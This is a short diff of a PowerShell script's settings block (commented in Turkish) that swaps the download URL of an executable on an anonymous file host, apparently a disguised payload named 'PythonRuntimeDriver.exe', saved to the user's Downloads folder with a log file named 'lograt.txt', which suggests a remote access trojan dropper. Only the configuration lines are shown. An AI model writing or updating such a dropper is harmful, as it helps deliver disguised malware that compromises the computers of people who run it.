@@ -1,5 +1,5 @@
 # Ayarlar
-$exeUrl = "https://store10.gofile.io/download/web/f251cd75-0191-4927-9a7b-2035446b5c3d/pythonruntimeditor.exe"
+$exeUrl = "https://cold3.gofile.io/download/web/eb0e07d2-e698-48f9-8fa7-20a9f86b59de/PythonRuntimeDriver.exe"
 $localPath = "$env:USERPROFILE\Downloads\pythonruntimeditor.exe"
 $logFile = "$env:USERPROFILE\Downloads\lograt.txt"
 
